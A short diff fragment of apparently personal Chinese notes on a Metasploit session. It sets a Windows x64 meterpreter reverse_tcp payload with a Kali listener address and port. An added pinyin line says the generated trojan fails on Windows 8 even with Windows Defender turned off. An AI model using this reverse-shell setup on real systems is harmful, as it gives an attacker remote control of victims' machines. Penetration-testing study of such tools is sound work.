@@ -49,3 +49,4 @@ set payload windows/x64/meterpreter/reverse_tcp
 set lhost 192.168.55.201                 kali  ip 地址
 set lport 50000                          
 run
+win8 buneng yunxing shengchengde muma guanle windows defender yebuxing
